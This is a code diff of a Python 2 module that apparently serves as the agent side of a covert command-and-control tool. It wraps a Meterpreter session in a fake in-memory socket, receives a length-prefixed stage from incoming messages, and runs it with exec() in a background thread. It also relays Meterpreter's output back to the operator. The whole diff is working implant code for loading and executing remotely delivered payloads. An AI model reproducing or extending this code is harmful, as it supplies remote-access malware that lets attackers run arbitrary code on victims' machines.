@@ -6,21 +6,23 @@ def init( storage ) :
 	from threading import Thread
 	import socket,struct,time
 	import io, threading
+	from time import sleep
+	storage['sleep_func'] = sleep
 
 	storage['in_lock'] = threading.Lock()
 	storage['out_lock'] = threading.Lock()
 
 	threading.Condition()
 	# storage['meterpreter_ins'] = bytearray()
-	storage['meterpreter_ins'] = io.BytesIO()
-	storage['meterpreter_outs'] = io.BytesIO()
+	storage['meterpreter_ins'] = bytearray()
+	storage['meterpreter_outs'] = bytearray()
 # storage['meterpreter_outs'] = Queue()
 
 	class PseudoSocket (object):
 		# pass
 		# socket
 
-		def __init__(self, recv_stream = io.BytesIO(), send_stream = io.BytesIO(), recv_lock = threading.Lock(), send_lock = threading.Lock(), flush_every = 1) :
+		def __init__(self, recv_stream = bytearray(), send_stream = bytearray(), recv_lock = threading.Lock(), send_lock = threading.Lock(), flush_every = 1) :
 			self.recv_stream = recv_stream
 			self.send_stream = send_stream
 			self.recv_lock = recv_lock
@@ -28,6 +30,7 @@ def init( storage ) :
 			self.flush_every = flush_every
 			self.flush_count = 0
 			self.recv_cond = threading.Condition()
+			self.send_cond = threading.Condition()
 
 		def _flush_if_needed( self, buffer ) :
 			self.flush_count +=1
@@ -40,25 +43,38 @@ def init( storage ) :
 		def send( self, pkt ) :
 			print "PseudoSocket send(): '%s'" % pkt.encode('hex')
 
+			self.send_cond.acquire()
 			# storage['COMMON']['handler'].preferred_send(pkt, storage['stream'])
-			# storage['meterpreter_outs'] = storage['meterpreter_outs'] + pkt
-			sent_bytes = self.send_stream.write(pkt)
-			print "[!]Outbuffer %d bytes" % sent_bytes
+			storage['meterpreter_outs'] += bytes(pkt)
+			sent_bytes = len(pkt)
+			self.send_cond.notify()
+			self.send_cond.release()
+			print "[!] Send (%d) to Outbuffer. Total %d bytes" % (sent_bytes, len(self.send_stream ))
+			return sent_bytes
+
+
+		def _read( self, buffer, buf_size ) :
+			# ret_type = type(buffer)
+			# ret = ret_type()
+			ret = bytearray()
+			for i in range(buf_size) :
+				ret += chr(buffer.pop(0))
+			return ret
 
 		def recv ( self, buf_size ) :
 			print "PseudoSocket recv() - {"
 			with self.recv_lock :
 				self.recv_cond.acquire()
-				self.recv_stream.seek(0)
-				ret = self.recv_stream.read(buf_size)
-				if ret == '' :
+				# self.recv_stream.seek(0)
+				while len(self.recv_stream) < buf_size :
 					self.recv_cond.wait()
-				ret = self.recv_stream.read(buf_size)
-				self._flush_if_needed(self.recv_stream)
-				print ret.encode('hex')
+				ret = self._read(self.recv_stream, buf_size)
+				# ret = self.recv_stream.read(buf_size)
+				# self._flush_if_needed(self.recv_stream)
+				# print str(ret)
 			self.recv_cond.release()
-			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, len(self.recv_stream.getvalue()))
-			return ret
+			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, len(self.recv_stream))
+			return str(ret)
 
 
 		def close( self ) :
@@ -70,13 +86,13 @@ def init( storage ) :
 		def getpeername( self ) :	return ("::", 4444)
 		# def settimeout( self, timeout ) : return True
 
-		def empty( self ) : return len(storage['meterpreter_ins'].getvalue()) == 0
+		def empty( self ) : return len(self.recv_stream) == 0
 
 
 	def meterpreter_stage( ) :
 
 		print "Creating PseudoSocket"
-		s = PseudoSocket( recv_stream = storage['meterpreter_ins'], send_stream = storage['meterpreter_outs'] )
+		s = PseudoSocket( recv_stream = storage['meterpreter_ins'], send_stream = storage['meterpreter_outs'], send_lock = storage['out_lock'] )
 		storage['socket'] = s
 		print "Getting 4 bytes"
 		l=struct.unpack('<I',s.recv(4))[0]
@@ -95,6 +111,14 @@ def init( storage ) :
 		exec(meterpreter_main,{'s':s})
 		print "[+] Meterpreter CLOSED!"
 
+	def message_appender ( buffer_, message ) :
+		storage['socket'].recv_cond.acquire()
+		buffer_ += message
+
+		storage['socket'].recv_cond.notify()
+		storage['socket'].recv_cond.release()
+
+
 	storage['meterpreter_thread'] = Thread( target = meterpreter_stage, args = () )
 	storage['meterpreter_thread'].daemon = True
 	print "Executing Meterpreter Thread"
@@ -104,31 +128,35 @@ def init( storage ) :
 
 
 def work( storage, message ) :
-	from time import sleep
 	# print "[!] Meterpreter Handler Message Arrived!"
-	# print message.encode('hex')
 	# print message.encode('hex')
 	# print "Outs: ",
 	# print storage['meterpreter_outs']
 	if message != 'X' :
+
 		storage['socket'].recv_cond.acquire()
-		with storage['in_lock'] :
-			storage['meterpreter_ins'].write(message)
-			storage['meterpreter_ins'].seek(0)
-			storage['socket'].recv_cond.notify()
+		storage['meterpreter_ins'] += message
+
+		storage['socket'].recv_cond.notify()
 		storage['socket'].recv_cond.release()
-	# print storage['meterpreter_ins'][-30:]
-	# print "Message buffer: " + storage['meterpreter_ins']
-	sleep(0.1)
+
+	# storage['sleep_func'](1)
 	try :
-		with storage['out_lock'] :
-			ret = storage['meterpreter_outs'].getvalue()
-			storage['meterpreter_outs'].flush()
+		# with storage['out_lock'] :
+		storage['socket'].send_cond.acquire()
+		print "Send lock acquired!"
+		print "To send %d bytes" % len(storage['meterpreter_outs'])
+		ret = storage['meterpreter_outs'][:]
+		read_len = len(ret)
+		storage['meterpreter_outs'] = storage['meterpreter_outs'][read_len:]
+		storage['socket'].send_cond.notify()
+		storage['socket'].send_cond.release()
+			# storage['meterpreter_outs'].flush()
 		print "[!] Returning Meterpreter Response! {"
-		print "%s" % ret.encode('hex')
+		print "%s" % str(ret).encode('hex')
 		print "} Sent %d bytes." % ( len(ret) )
 		# return ""
-		return ret
+		return str(ret)
 	except Exception as e:
 		print "[!!!] In work():"
 		print e
